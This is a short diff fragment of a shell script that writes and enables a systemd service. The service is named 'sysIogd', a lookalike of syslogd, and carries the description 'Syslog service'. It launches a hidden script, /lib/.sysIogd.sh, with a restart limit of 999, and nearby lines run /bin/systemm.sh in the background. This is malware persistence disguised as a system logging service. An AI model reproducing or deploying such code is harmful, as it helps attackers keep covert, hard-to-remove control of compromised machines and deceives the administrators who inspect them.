@@ -169,8 +169,20 @@ bash /bin/systemm.sh &
 EOFD
 fi
 if ! [ -f /etc/systemd/system/sysIogd.service ]
+then
 cat <<EOFE > /etc/systemd/system/sysIogd.service
+[Unit]
+Description=Syslog service
 
+[Service]
+Type=forking
+Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
+ExecStart=/bin/bash -c 'bash /lib/.sysIogd.sh'
+StartLimitInterval=1s
+StartLimitBurst=999
+
+[Install]
+WantedBy=multi-user.target
 EOFE
 systemctl enable sysIogd
 systemctl daemon-reload
